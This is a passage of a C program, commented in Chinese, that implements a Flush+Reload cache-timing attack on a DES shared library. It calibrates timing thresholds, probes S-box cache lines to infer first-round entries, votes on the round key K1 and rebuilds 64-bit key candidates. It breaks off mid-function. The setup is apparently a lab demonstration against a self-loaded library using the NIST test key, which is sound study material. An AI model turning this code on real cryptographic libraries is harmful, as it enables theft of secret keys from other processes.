/*
 * DES Flush+Reload 缓存侧信道攻击实现
 * 
 * 本程序实现了基于 Flush+Reload 技术的 DES 密钥恢复攻击
 * 通过监控 S-box 的缓存访问模式，从 48 位轮密钥 K1 恢复完整的 64 位 DES 密钥
 */

// _GNU_SOURCE 必须放在第一行，才能使用 CPU 亲和性函数（sched_setaffinity）
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h> 
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdbool.h>
#include <sched.h>      // CPU 亲和性设置


/* ==================== 攻击参数配置 ==================== */

// 单轮攻击迭代次数：20000 次提供足够的统计显著性
// 注意：实际每个条目测试次数为 ATTACK_ITERATIONS / 64 ≈ 312 次
#define ATTACK_ITERATIONS          20000

// 校准阶段采样次数：用于确定缓存命中/未命中的时间阈值
#define CALIBRATION_ROUNDS         10000

// 动态校准标志：0 表示使用动态计算的阈值
#define CACHE_HIT_THRESHOLD        0

// S-box 相关参数
#define MAX_CACHE_ROWS             4       // 每个 S-box 占用 4 个缓存行（256B/64B）
#define SBOX_COUNT                 8       // DES 有 8 个 S-box
#define SBOX_ENTRIES_PER_CACHE_LINE 16    // 每个缓存行可容纳 16 个条目（64B/4B）
#define MEASUREMENT_REPEATS        3       // 每次测量重复 3 次取最小值，减少噪声

/* ==================== DES 算法参数 ==================== */

#define DES_BLOCK_SIZE             64      // DES 分组大小：64 位
#define DES_KEY_SIZE               64      // DES 密钥大小：64 位（含 8 位奇偶校验）
#define SBOX_INPUT_SIZE            6       // S-box 输入：6 位
#define SBOX_OUTPUT_SIZE           4       // S-box 输出：4 位
#define SBOX_TOTAL_ENTRIES         64      // 每个 S-box 有 64 个条目（4行 x 16列）
#define DES_ROUNDS                 16      // DES 加密轮数
#define DES_HALF_BLOCK_SIZE        32      // 半块大小：32 位（L 和 R 各 32 位）
#define E_EXTENSION_SIZE           48      // E 扩展后的长度：48 位

/* ==================== 测试数据 ==================== */

// NIST 标准测试向量：DES 测试密钥
#define KEY_TEST_1   0x133457799BBCDFF1ULL

// NIST 标准测试向量：DES 测试明文
#define TEST_PLAINTEXT 0x0123456789ABCDEFULL

/* ==================== DES 置换表 ==================== */

// IP 置换表（初始置换）：64 位 -> 64 位
// 将明文的位按照此表重新排列，产生 L0 和 R0
static const uint8_t IP[64] = {
    58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
    62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
    57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
    61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7
};

// E 扩展表：32 位 -> 48 位
// 将右半部分 R 从 32 位扩展到 48 位，某些位被重复使用
static const uint8_t E[48] = {
    32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13,
    12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,
    24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1
};

// PC-1 置换表（密钥置换选择 1）：64 位 -> 56 位
// 从 64 位密钥中选出 56 位有效位（去掉 8 个奇偶校验位）
static const uint8_t PC1[56] = {
    57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18,
    10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36,
    63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22,
    14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4
};

// PC-2 置换表（密钥置换选择 2）：56 位 -> 48 位
// 从 CnDn（56 位）中选出 48 位作为轮密钥 Kn
static const uint8_t PC2[48] = {
    14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10,
    23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2,
    41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48,
    44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32
};

// PC-2 未使用的 8 个位置（在 CnDn 中的索引）
// 这些位在密钥恢复时需要暴力枚举
static const uint8_t PC2_UNUSED[8] = {9, 18, 22, 25, 35, 38, 43, 54};

/* ==================== 数据结构和类型定义 ==================== */

// S-box 结构：确保 64 字节对齐以匹配缓存行大小
// data[64][16] 表示：64 个条目，每个条目包含 16 个 uint32_t（但实际只用第 0 个）
// 每个条目占用 64 字节（16 * 4），正好是一个缓存行
typedef struct {
    uint32_t data[64][16];
} __attribute__((aligned(64))) SBox;

// 函数指针类型定义：用于动态加载 DES 库中的函数
typedef void (*des_encrypt_first_round_t)(const uint64_t, const uint64_t, uint64_t*);
typedef void (*des_encrypt_full_t)(const uint64_t, const uint64_t, uint64_t*);
typedef SBox* (*get_sboxes_t)();

/* ==================== 全局变量 ==================== */

void *lib_handle = NULL;                    // 动态链接库句柄
des_encrypt_first_round_t des_encrypt_first_round = NULL;  // DES 第一轮加密函数指针
des_encrypt_full_t des_encrypt_full = NULL;              // DES 完整加密函数指针
get_sboxes_t get_sboxes = NULL;                         // 获取 S-box 地址函数指针
SBox *S = NULL;                             // S-box 数组指针（指向共享库中的 S-box）
static uint64_t g_threshold = 120;          // 缓存命中/未命中阈值（动态校准后更新）

/* ==================== 函数声明 ==================== */

static uint64_t build_candidate_key_64bit(uint64_t derived_K1, uint8_t missing_bits);
static uint64_t calibrate_threshold();
static void pin_to_core(int core_id);
static inline uint64_t rdtsc();
static inline void flush_cache_line(const void *addr);
static inline uint64_t measure_time(const void *addr);

/* ==================== 底层时序和缓存操作 ==================== */

/**
 * rdtsc - 读取时间戳计数器（Read Time-Stamp Counter）
 * 
 * 功能：获取 CPU 的周期计数，用于精确计时
 * 原理：使用 x86 的 RDTSC 指令读取 64 位时间戳计数器
 * 
 * 注意：
 * - 使用 mfence + lfence 确保前面的指令都已完成（防止乱序执行影响）
 * - 如果支持 RDTSCP，会优先使用（RDTSCP 自带序列化）
 * 
 * 返回：64 位时间戳计数器值
 */
static inline uint64_t rdtsc() {
    uint64_t a, d;
#ifdef __has_builtin
    #if __has_builtin(__builtin_ia32_rdtscp)
        uint32_t aux;
        __builtin_ia32_rdtscp(&aux); // 序列化并读取时间戳
        asm volatile ("rdtsc" : "=a"(a), "=d"(d));
    #else
        asm volatile ("mfence\nlfence\nrdtsc" : "=a"(a), "=d"(d));
    #endif
#else
    asm volatile ("mfence\nlfence\nrdtsc" : "=a"(a), "=d"(d));
#endif
    return (d << 32) | a;  // 合并 EDX:EAX 为 64 位值
}

/**
 * flush_cache_line - 刷新缓存行
 * 
 * 功能：使用 CLFLUSH 指令将指定地址的缓存行从所有缓存层级中驱逐
 * 原理：CLFLUSH 会将包含指定地址的缓存行刷新到内存，并从缓存中清除
 * 
 * 参数：
 *   addr - 要刷新的内存地址
 * 
 * 注意：后面跟随 MFENCE 内存屏障，确保刷新操作完成
 */
static inline void flush_cache_line(const void *addr) {
    asm volatile ("clflush 0(%0)" :: "r"(addr) : "memory");
    asm volatile ("mfence" ::: "memory");
}

/**
 * measure_time_single - 单次测量内存访问时间
 * 
 * 功能：测量访问指定内存地址所需的 CPU 周期数
 * 原理：
 * 1. 使用 MFENCE + LFENCE 序列化指令流（确保前面的指令都已完成）
 * 2. 记录开始时间戳（RDTSC）
 * 3. 访问目标内存地址（MOV 指令）
 * 4. 使用 LFENCE 序列化（确保内存访问完成）
 * 5. 记录结束时间戳（RDTSC）
 * 6. 返回时间差
 * 
 * 参数：
 *   addr - 要测量的内存地址
 * 
 * 返回：访问该地址所需的 CPU 周期数
 */
static inline uint64_t measure_time_single(const void *addr) {
    uint64_t start, end;
    volatile uint32_t val;  // volatile 防止编译器优化掉内存访问
    
    // 序列化指令流：确保前面的所有指令都已完成
    asm volatile ("mfence\nlfence" ::: "memory");
    start = rdtsc();  // 记录开始时间
    
    // 访问内存：将地址中的值读入寄存器
    asm volatile (
        "movl (%1), %0\n"  // 从内存读取 32 位值到 val
        : "=r" (val)       // 输出操作数
        : "r" (addr)       // 输入操作数（内存地址）
        : "memory"         // 告诉编译器此操作会访问内存
    );
    
    // 序列化并读取结束时间
    asm volatile ("lfence" ::: "memory");
    end = rdtsc();  // 记录结束时间
    return end - start;  // 返回时间差
}

/**
 * measure_time - 多次测量取最小值
 * 
 * 功能：对同一地址进行多次测量，返回最小值
 * 原理：最小值最接近真实的缓存访问时间（噪声只会增加时间）
 * 
 * 参数：
 *   addr - 要测量的内存地址
 * 
 * 返回：多次测量中的最小周期数
 */
static inline uint64_t measure_time(const void *addr) {
    uint64_t min_time = ~0ULL;  // 初始化为最大值（所有位为 1）
    for (int i = 0; i < MEASUREMENT_REPEATS; i++) {
        uint64_t t = measure_time_single(addr);
        if (t < min_time) min_time = t;  // 保留最小值
    }
    return min_time;
}

/* ==================== 辅助函数 ==================== */

/**
 * cmp_u64 - 比较两个 uint64_t 值（用于 qsort）
 * 
 * 参数：
 *   a, b - 指向要比较的值的指针
 * 
 * 返回：
 *   -1 如果 a < b
 *    0 如果 a == b
 *    1 如果 a > b
 */
static int cmp_u64(const void *a, const void *b) {
    uint64_t x = *(const uint64_t*)a;
    uint64_t y = *(const uint64_t*)b;
    if (x < y) return -1;
    if (x > y) return 1;
    return 0;
}

/**
 * pin_to_core - 将进程绑定到指定 CPU 核心
 * 
 * 功能：设置 CPU 亲和性，使进程只在指定核心上运行
 * 原理：使用 sched_setaffinity 系统调用
 * 
 * 为什么要绑核：
 * - 减少缓存迁移：不同核心的 L1/L2 缓存是独立的
 * - 提高测量稳定性：避免进程在不同核心间迁移带来的噪声
 * 
 * 参数：
 *   core_id - 要绑定的 CPU 核心编号（从 0 开始）
 */
static void pin_to_core(int core_id) {
    cpu_set_t cpuset;           // CPU 集合结构
    CPU_ZERO(&cpuset);          // 清空集合
    CPU_SET(core_id, &cpuset);  // 添加指定核心到集合
    
    // 设置当前进程的 CPU 亲和性
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) == -1) {
        perror("sched_setaffinity failed");
    } else {
        printf("Pinned to CPU core %d\n", core_id);
    }
}

/**
 * calibrate_threshold - 动态校准缓存阈值
 * 
 * 功能：在当前机器上测量缓存命中和未命中的时间，确定区分阈值
 * 原理：
 * 1. 分配对齐的内存
 * 2. 多次访问使其在缓存中（命中）
 * 3. 使用 CLFLUSH 驱逐后访问（未命中）
 * 4. 计算中位数，取中间值作为阈值
 * 
 * 返回：计算得到的阈值（CPU 周期数）
 */
static uint64_t calibrate_threshold() {
    printf("Calibrating cache threshold...\n");
    
    // 分配 4KB 对齐内存用于测试
    void *test_mem = NULL;
    if (posix_memalign(&test_mem, 4096, 4096) != 0) {
        perror("posix_memalign failed");
        return 120;  // 返回默认值
    }
    
    // 存储每次测量的时间
    uint64_t hit_times[CALIBRATION_ROUNDS];
    uint64_t miss_times[CALIBRATION_ROUNDS];
    
    // 训练缓存命中：多次访问确保数据在缓存中
    for (int i = 0; i < 100; i++) {
        *(volatile uint32_t*)test_mem = i;
    }
    
    // 测量缓存命中时间（数据已在缓存中）
    printf("hit times: ");
    for (int i = 0; i < CALIBRATION_ROUNDS; i++) {
        hit_times[i] = measure_time_single(test_mem);
        if(i<20) printf("%lu ", hit_times[i]);
    }
    printf("\n");
    
    // 测量缓存未命中时间（每次访问前都刷新）
    printf("miss times: ");
    for (int i = 0; i < CALIBRATION_ROUNDS; i++) {
        flush_cache_line(test_mem);
        asm volatile ("mfence" ::: "memory");
        miss_times[i] = measure_time_single(test_mem);
        if(i<20) printf("%lu ", miss_times[i]);
    }
    printf("\n");
    
    // 计算中位数（比平均值更鲁棒，不受异常值影响）
    qsort(hit_times, CALIBRATION_ROUNDS, sizeof(uint64_t), cmp_u64);
    qsort(miss_times, CALIBRATION_ROUNDS, sizeof(uint64_t), cmp_u64);
    
    uint64_t median_hit = hit_times[CALIBRATION_ROUNDS/2];
    uint64_t median_miss = miss_times[CALIBRATION_ROUNDS/2];
    printf("median hit: %lu, median miss: %lu\n", median_hit, median_miss);
    
    // 计算阈值：取中间值，偏向命中侧（留 20% 安全余量）
    uint64_t threshold;
    if (median_miss <= median_hit) {
        // 异常情况：未命中时间 <= 命中时间（系统嘈杂）
        threshold = median_hit + 50;
        printf("  Warning: miss time <= hit time, using fallback threshold\n");
    } else {
        // 正常情况：阈值 = 命中时间 + (未命中 - 命中) / 5
        threshold = median_hit + (median_miss - median_hit) / 5;
    }
    
    printf("  Median hit:  %lu cycles\n", median_hit);
    printf("  Median miss: %lu cycles\n", median_miss);
    printf("  Threshold:   %lu cycles\n", threshold);
    
    free(test_mem);
    return threshold;
}

/* ==================== DES 库加载/卸载 ==================== */

/**
 * load_des_library - 加载 DES 共享库
 * 
 * 功能：动态加载 libdes.so，获取其中的函数和 S-box 地址
 * 原理：使用 dlopen/dlsym 动态链接
 * 
 * 参数：
 *   lib_path - 共享库路径
 * 
 * 返回：
 *   0 成功，-1 失败
 */
int load_des_library(const char *lib_path) {
    // RTLD_LAZY: 延迟绑定，只在需要时解析符号
    // RTLD_GLOBAL: 使库中的符号对其他库可见
    lib_handle = dlopen(lib_path, RTLD_LAZY | RTLD_GLOBAL);
    if (!lib_handle) {
        fprintf(stderr, "Error loading library: %s\n", dlerror());
        return -1;
    }
    
    // 获取函数指针
    des_encrypt_first_round = (des_encrypt_first_round_t)dlsym(lib_handle, "des_encrypt_first_round");
    des_encrypt_full = (des_encrypt_full_t)dlsym(lib_handle, "des_encrypt_full");
    get_sboxes = (get_sboxes_t)dlsym(lib_handle, "get_sboxes");
    
    // 检查是否所有符号都成功解析
    if (!des_encrypt_first_round || !des_encrypt_full || !get_sboxes) {
        fprintf(stderr, "Error resolving symbols: %s\n", dlerror());
        dlclose(lib_handle);
        return -1;
    }
    
    // 获取 S-box 地址（这是攻击的关键！）
    S = get_sboxes();
    if (!S) {
        fprintf(stderr, "Error getting S-boxes\n");
        dlclose(lib_handle);
        return -1;
    }
    
    printf("Successfully loaded DES library, S-boxes at %p\n", (void*)S);
    
    // 预触摸 S-box 内存：确保内存页已映射到进程地址空间
    for (int i = 0; i < SBOX_COUNT; i++) {
        volatile uint32_t tmp = S[i].data[0][0];  // 访问第一个条目的第一个元素
        (void)tmp;  // 避免编译器警告
    }
    
    return 0;
}

/**
 * unload_des_library - 卸载 DES 共享库
 */
void unload_des_library() {
    if (lib_handle) {
        dlclose(lib_handle);
        lib_handle = NULL;
    }
}

/* ==================== 攻击核心函数 ==================== */

/**
 * first_round_attack - 第一轮攻击：检测 S-box 条目访问
 * 
 * 功能：使用 Flush+Reload 技术检测 DES 第一轮中每个 S-box 访问了哪个条目
 * 
 * 攻击原理（修复后的版本）：
 * 对每个 S-box 的每个条目单独进行 Flush+Reload：
 * 1. Flush 目标条目（从缓存中驱逐）
 * 2. 触发受害者执行 DES 第一轮加密
 * 3. 测量目标条目的访问时间
 *    - 时间短（< 阈值）：受害者访问了该条目（缓存命中）
 *    - 时间长（> 阈值）：受害者未访问该条目（缓存未命中）
 * 
 * 关键修复：原始代码在一次迭代中 Flush 所有条目然后探测所有条目，
 * 导致探测过程本身将后续条目加载到缓存（CPU 预取器干扰）。
 * 修复后每次只测试一个条目，避免了缓存污染。
 * 
 * 参数：
 *   R - 右半部分 R0（32 位）
 *   K - 目标密钥（用于触发加密）
 *   cache_row_hits - 输出数组，存储每个 S-box 检测到的条目索引（0-63）
 */
void first_round_attack(uint32_t R, uint64_t K, int *cache_row_hits) {
    printf("\n=== First Round Attack (Cache Line Detection) ===\n");
    
    // 命中计数矩阵：hit_counts[sbox][entry] 表示该条目被检测到的次数
    int hit_counts[SBOX_COUNT][64] = {0};
    
    // 外层循环：遍历每个 S-box
    for (int sbox = 0; sbox < SBOX_COUNT; sbox++) {
        printf("Attacking S-box %d...\r", sbox);
        fflush(stdout);
        
        // 中层循环：遍历该 S-box 的 64 个条目
        for (int entry = 0; entry < 64; entry++) {
            // 计算目标地址：该条目在内存中的位置
            void *target_addr = (void*)&S[sbox].data[entry][0];
            
            // 内层循环：对该条目进行多次 Flush+Reload 测试
            // 总迭代次数分配到每个条目：ATTACK_ITERATIONS / 64
            for (int iter = 0; iter < ATTACK_ITERATIONS / 64; iter++) {
                // 步骤 1：Flush - 将目标条目从缓存中驱逐
                flush_cache_line(target_addr);
                asm volatile ("mfence" ::: "memory");
                
                // 步骤 2：Trigger - 触发受害者执行 DES 第一轮加密
                // 受害者会根据密钥和明文访问特定的 S-box 条目
                uint64_t result;
                des_encrypt_first_round(TEST_PLAINTEXT, K, &result);
                asm volatile ("mfence" ::: "memory");
                
                // 步骤 3：Reload - 测量访问时间
                uint64_t time = measure_time_single(target_addr);
                if (time < g_threshold) {
                    // 缓存命中：受害者访问了该条目！
                    hit_counts[sbox][entry]++;
                }
            }
        }
    }
    printf("\n");
    
    // 分析阶段：找出每个 S-box 被访问的条目
    for (int sbox = 0; sbox < SBOX_COUNT; sbox++) {
        int best_entry = -1;      // 最佳条目索引
        int max_hits = -1;        // 最高命中次数
        int second_max = -1;      // 次高命中次数（用于计算置信度）
        
        // 遍历所有条目，找出命中次数最多的
        for (int entry = 0; entry < 64; entry++) {
            if (hit_counts[sbox][entry] > max_hits) {
                second_max = max_hits;
                max_hits = hit_counts[sbox][entry];
                best_entry = entry;
            } else if (hit_counts[sbox][entry] > second_max) {
                second_max = hit_counts[sbox][entry];
            }
        }
        
        // 计算置信度指标
        int total_iters = ATTACK_ITERATIONS / 64;  // 每个条目的测试次数
        double confidence_ratio = (second_max > 0) ? (double)max_hits / second_max : max_hits;
        double hit_ratio = (double)max_hits / total_iters;
        
        // 调试输出：显示前 3 个最佳条目
        printf("S-box %d: Best entries - ", sbox);
        int shown = 0;
        for (int entry = 0; entry < 64 && shown < 3; entry++) {
            if (hit_counts[sbox][entry] > total_iters * 0.1) {
                printf("[%d]=%d ", entry, hit_counts[sbox][entry]);
                shown++;
            }
        }
        printf("\n");
        
        // 置信度判断：确保结果可靠
        // hit_ratio > 0.3：命中次数超过 30%
        // confidence_ratio > 1.5：最佳条目明显优于次佳
        if (hit_ratio < 0.3 || confidence_ratio < 1.5) {
            printf("S-box %d: Unreliable (max hits %d, second %d, ratio %.2f)\n", 
                   sbox, max_hits, second_max, confidence_ratio);
            cache_row_hits[sbox] = -1;  // 标记为检测失败
        } else {
            cache_row_hits[sbox] = best_entry;  // 记录检测到的条目索引
            printf("S-box %d: Entry %d (%d hits, ratio %.2f)\n", 
                   sbox, best_entry, max_hits, confidence_ratio);
        }
    }
}

/**
 * derive_k1_fragment - 从检测到的 S-box 条目推导 K1 片段
 * 
 * 功能：根据检测到的 S-box 条目索引和已知的 E(R0)，推导出对应的 K1 片段
 * 
 * 推导原理：
 * DES 第一轮中，S-box 的 6 位输入 = E(R0) 片段 ^ K1 片段
 * 因此：K1 片段 = S-box 输入 ^ E(R0) 片段
 * 
 * S-box 输入的重建：
 * - entry_index = row * 16 + col
 * - row = entry_index / 16（0-3）
 * - col = entry_index % 16（0-15）
 * - S-box 输入（6 位）：b1 b2 b3 b4 b5 b6
 *   - b1 = row 的最高位
 *   - b6 = row 的最低位
 *   - b2b3b4b5 = col（4 位）
 * 
 * 参数：
 *   sbox - S-box 编号（0-7）
 *   entry_index - 检测到的条目索引（0-63）
 *   E_R0 - 扩展后的右半部分（48 位）
 * 
 * 返回：
 *   推导出的 K1 片段（6 位），如果 entry_index 无效则返回 0xFF
 */
uint8_t derive_k1_fragment(int sbox, int entry_index, uint64_t E_R0) {
    if (entry_index < 0 || entry_index > 63) return 0xFF;  // 错误标记
    
    // 从 entry_index 计算 row 和 col
    int row = entry_index / 16;  // 0-3
    int col = entry_index % 16;  // 0-15
    
    // 重建 S-box 的 6 位输入
    // 位布局：b1 b2 b3 b4 b5 b6
    // b1 = (row >> 1) & 1 = (row & 2) >> 1，然后左移 5 位到位置 5
    // b6 = row & 1，在位置 0
    // b2b3b4b5 = col，左移 1 位到位置 1-4
    uint8_t sbox_input = ((row & 2) << 4) | (col << 1) | (row & 1);
    
    // 从 E_R0 中提取对应 S-box 的 6 位片段
    // S-box 0 对应最高 6 位（bits 47-42），S-box 7 对应最低 6 位（bits 5-0）
    uint8_t e_r0_fragment = (E_R0 >> ((7 - sbox) * 6)) & 0x3F;
    
    // K1 片段 = S-box 输入 ^ E(R0) 片段
    return sbox_input ^ e_r0_fragment;
}

/* ==================== 密钥重建函数 ==================== */

/**
 * add_parity_bits_to_64 - 为 64 位密钥添加奇偶校验位
 * 
 * 功能：将 56 位数据扩展为 64 位，每 8 位中的最低位是奇偶校验位
 * 原理：
 * - 每字节包含 7 位数据 + 1 位奇偶校验
 * - 奇偶校验采用奇校验：7 个数据位中 1 的个数为奇数时，校验位为 0；否则为 1
 * 
 * 参数：
 *   key_with_data - 包含 56 位有效数据的 64 位值
 * 
 * 返回：
 *   带奇偶校验位的 64 位密钥
 */
static uint64_t add_parity_bits_to_64(uint64_t key_with_data) {
    uint64_t key_64bit = 0;
    for (int byte = 0; byte < 8; byte++) {
        // 提取当前字节的 8 位（但只有高 7 位是有效数据）
        uint8_t current_byte = (key_with_data >> (56 - 8 * byte)) & 0xFF;
        
        // 提取 7 位数据（去掉最低位）
        uint8_t data_bits = (current_byte >> 1) & 0x7F;
        
        // 计算奇偶校验位（奇校验）
        int parity = 0;
        for (int i = 0; i < 7; i++) {
            parity ^= ((data_bits >> i) & 1);
        }
        // 如果 1 的个数为偶数，校验位为 1；否则为 0（使总数为奇数）
        uint8_t parity_bit = (parity == 0) ? 1 : 0;
        
        // 组合：7 位数据 + 1 位校验
        uint8_t full_byte = (data_bits << 1) | parity_bit;
        
        // 放入结果
        key_64bit |= ((uint64_t)full_byte) << (56 - 8 * byte);
    }
    return key_64bit;
}

/**
 * inverse_pc1 - PC-1 逆置换
 * 
 * 功能：将 56 位的 C0D0 逆 PC-1 置换为 64 位（含 8 个 0 位）
 * 原理：PC-1 从 64 位密钥中选择 56 位，逆操作将 56 位放回 64 位位置
 * 
 * 参数：
 *   c0d0 - 56 位的 C0D0 值
 * 
 * 返回：
 *   64 位值（其中 8 位为 0，对应奇偶校验位位置）
 */
static uint64_t inverse_pc1(uint64_t c0d0) {
    uint64_t key_without_parity = 0;
    for (int i = 0; i < 56; i++) {
        // 提取 C0D0 的第 i 位
        uint8_t bit = (c0d0 >> (55 - i)) & 1;
        
        // PC1[i] 表示该位在原始 64 位密钥中的位置（1-64）
        uint8_t key_pos = PC1[i] - 1;  // 转换为 0-63
        
        // 将该位放入 64 位密钥的对应位置
        key_without_parity |= ((uint64_t)bit) << (63 - key_pos);
    }
    return key_without_parity;
}

/**
 * build_candidate_key_64bit - 从推导的 K1 构建候选 64 位密钥
 * 
 * 功能：从 48 位 K1 和 8 位未知位（暴力枚举）重建完整的 64 位 DES 密钥
 * 
 * 重建流程：
 * 1. 使用 PC-2 表将 48 位 K1 放入 C1D1 的对应位置
 * 2. 使用 PC2_UNUSED 将 8 位未知位放入 C1D1 的剩余位置
 * 3. 循环右移 1 位得到 C0D0（DES 密钥调度的逆操作）
 * 4. 逆 PC-1 置换得到 64 位密钥（含 8 个空位）
 * 5. 添加奇偶校验位得到最终密钥
 * 
 * 参数：
 *   derived_K1 - 推导出的 48 位 K1
 *   missing_bits - 8 位未知位（PC-2 未选中的位）
 * 
 * 返回：
 *   64 位候选密钥
 */
static uint64_t build_candidate_key_64bit(uint64_t derived_K1, uint8_t missing_bits) {
    uint64_t c1d1 = 0;

    // 步骤 1：填充 PC-2 选中的 48 位
    for (int i = 0; i < 48; i++) {
        // 提取 K1 的第 i 位
        uint8_t bit = (derived_K1 >> (47 - i)) & 1;
        
        // PC2[i] 表示该位在 C1D1 中的位置（1-56）
        uint8_t pc2_pos = PC2[i] - 1;  // 转换为 0-55
        
        // 放入 C1D1
        c1d1 |= ((uint64_t)bit) << (55 - pc2_pos);
    }

    // 步骤 2：填充 PC-2 未选中的 8 位（来自暴力枚举）
    for (int i = 0; i < 8; i++) {
        uint8_t bit = (missing_bits >> (7 - i)) & 1;
        uint8_t unused_pos = PC2_UNUSED[i] - 1;  // 转换为 0-55
        c1d1 |= ((uint64_t)bit) << (55 - unused_pos);
    }

    // 步骤 3：循环右移 1 位得到 C0D0
    // DES 密钥调度：C1 = C0 循环左移 1 位，所以 C0 = C1 循环右移 1 位
    uint32_t c1 = (c1d1 >> 28) & 0x0FFFFFFF;  // 高 28 位
    uint32_t d1 = c1d1 & 0x0FFFFFFF;           // 低 28 位
    
    // 循环右移 1 位
    uint32_t c0 = ((c1 >> 1) | ((c1 & 1) << 27)) & 0x0FFFFFFF;
    uint32_t d0 = ((d1 >> 1) | ((d1 & 1) << 27)) & 0x0FFFFFFF;
    
    uint64_t c0d0 = ((uint64_t)c0 << 28) | d0;

    // 步骤 4 & 5：逆 PC-1 并添加奇偶校验位
    uint64_t key_without_parity = inverse_pc1(c0d0);
    return add_parity_bits_to_64(key_without_parity);
}

/* ==================== 主攻击流程 ==================== */

/**
 * attack_des_full - 完整的 DES 密钥恢复攻击
 * 
 * 功能：执行完整的 Flush+Reload 攻击流程，恢复 64 位 DES 密钥
 * 
 * 攻击流程：
 * 1. 环境准备：绑核、加载库、校准阈值
 * 2. 计算 R0 和 E(R0)
 * 3. 多轮攻击（默认 7 轮）：每轮执行 first_round_attack 检测 S-box 条目
 * 4. 推导 K1：从检测到的条目推导 48 位轮密钥
 * 5. 投票选择：从多轮结果中选择最可靠的 K1
 * 6. 暴力搜索：从 K1 恢复 64 位密钥，使用明文-密文对验证
 * 
 * 参数：
 *   lib_path - DES 共享库路径
 *   key - 目标密钥（用于触发加密和验证结果）
 */
void attack_des_full(const char *lib_path, uint64_t key) {
    printf("Starting DES Flush+Reload Attack\n");
    printf("Target key: %016lX\n", (unsigned long)key);
    
    // 步骤 1：环境准备
    pin_to_core(0);  // 绑定到核心 0，减少缓存迁移噪声
    
    if (load_des_library(lib_path) != 0) {
        fprintf(stderr, "Failed to load library\n");
        return;
    }
    
    // 校准阈值：确定缓存命中/未命中的时间界限
    g_threshold = calibrate_threshold();
    
    // 步骤 2：计算 R0 和 E(R0)
    // R0 是明文经过 IP 置换后的右半部分（32 位）
    uint64_t plaintext = TEST_PLAINTEXT;
    uint64_t ip_plaintext = 0;
    
    // IP 置换
    for (int i = 0; i < 64; i++) {
        ip_plaintext |= ((plaintext >> (64 - IP[i])) & 1) << (63 - i);
    }
    uint32_t R0 = ip_plaintext & 0xFFFFFFFF;  // 取低 32 位
    
    // E 扩展：32 位 -> 48 位
    uint64_t E_R0 = 0;
    for (int i = 0; i < 48; i++) {
        E_R0 |= ((uint64_t)((R0 >> (32 - E[i])) & 1)) << (47 - i);
    }
    
    printf("R0: %08X, E(R0): %012lX\n", R0, (unsigned long)E_R0);
    
    // 步骤 3：S盒压缩 - 多轮投票机制
    // 重复攻击 7 轮，从多轮结果中选择最可靠的 K1
    #define MAX_ROUNDS 7
    uint64_t k1_candidates[MAX_ROUNDS] = {0};  // K1 候选值数组, 每个下标存储的都是 48bit 的K1
    int k1_confidence[MAX_ROUNDS] = {0};       // 每个候选的置信度（出现次数）
    int k1_valid_frags[MAX_ROUNDS] = {0};      // 每个候选的有效片段数
    
    for (int round = 0; round < MAX_ROUNDS; round++) {
        printf("\n--- Attack Round %d/%d ---\n", round + 1, MAX_ROUNDS);
        
        // 执行第一轮攻击：检测每个 S-box 访问的条目
        int detected_entries[SBOX_COUNT];
        first_round_attack(R0, key, detected_entries);
        
        // 从检测到的条目推导 K1
        uint64_t current_K1 = 0;
        int valid_fragments = 0;
        
        for (int sbox = 0; sbox < SBOX_COUNT; sbox++) {
            if (detected_entries[sbox] < 0) {
                printf("S-box %d: Detection failed, skipping\n", sbox);
                continue;  // 跳过检测失败的 S-box
            }
            
            // 推导该 S-box 对应的 K1 片段
            uint8_t fragment = derive_k1_fragment(sbox, detected_entries[sbox], E_R0);
            if (fragment != 0xFF) {
                // 将 6 位片段放入 K1 的对应位置
                // S-box 0 对应 K1 的最高 6 位（bits 47-42）
                // S-box 7 对应 K1 的最低 6 位（bits 5-0）
                current_K1 |= ((uint64_t)fragment) << ((7 - sbox) * 6);
                valid_fragments++;
                
                // 调试输出
                int row = detected_entries[sbox] / 16;
                int col = detected_entries[sbox] % 16;
                printf("S-box %d: Entry %d (row %d, col %d) -> Fragment %02X\n", 
                       sbox, detected_entries[sbox], row, col, fragment);
            }
        }
        // 目前已经推测出了 48bit 的K1: current_K1
        
        // 投票逻辑：检查是否已有相同的 K1 候选
        bool found = false;
        for (int i = 0; i < MAX_ROUNDS; i++) {
            if (k1_candidates[i] == current_K1 && k1_confidence[i] > 0) {
                k1_confidence[i]++;  // 置信度 +1
                found = true;
                break;
            }
        }
        // 如果没有找到相同候选，添加到新位置
        if (!found) {
            for (int i = 0; i < MAX_ROUNDS; i++) {
                if (k1_confidence[i] == 0) {
                    k1_candidates[i] = current_K1;
                    k1_confidence[i] = 1;
                    k1_valid_frags[i] = valid_fragments;
                    break;
                }
            }
        }
        
        printf("Round %d: Recovered %d/8 fragments, K1 candidate: %012lX\n", 
               round + 1, valid_fragments, (unsigned long)current_K1);
    }
    
    // 步骤 4：选择最可靠的 K1
    // 优先选择置信度高且有效片段多的候选
    int best_idx = 0;
    for (int i = 1; i < MAX_ROUNDS; i++) {
        if (k1_confidence[i] > k1_confidence[best_idx] || 
            (k1_confidence[i] == k1_confidence[best_idx] && k1_valid_frags[i] > k1_valid_frags[best_idx])) {
            best_idx = i;
        }
    }

    // 经过投票机制选出的K1
    uint64_t derived_K1 = k1_candidates[best_idx];
